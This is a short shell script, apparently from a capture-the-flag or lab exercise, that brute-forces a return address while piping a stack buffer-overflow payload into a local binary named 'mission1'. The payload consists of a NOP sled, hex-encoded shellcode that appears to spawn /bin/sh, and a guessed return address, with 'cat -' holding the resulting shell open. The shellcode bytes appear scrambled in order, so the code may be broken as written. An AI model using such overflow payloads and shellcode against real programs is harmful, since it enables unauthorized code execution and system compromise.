#!/bin/sh

for i in `seq 0 1`
do      
        base=$((0x8b + $i))

        printf "0x%X - %d \n" $base $base
        HEX="$(printf '%X' $base)"
        #(python -c "print(r'\x$HEX')")
        (python -c "print('\x90'*206 + '\x1f\xeb\x89\x5e\x08\x76\xc0\x31\x46\x88\x89\x07\x0c\x46\x0b\xb0\xf3\x89\x4e\x8d\x8d\x08\x0c\x56\x80\xcd\xdb\x31\xd8\x89\xcd\x40\xe8\x80\xff\xdc\xff\xff' + 'b/nis/hh' + '\x90'*21 + '\x$HEX' + '\xc4\xff\xff')"; cat -) | ../mission1
done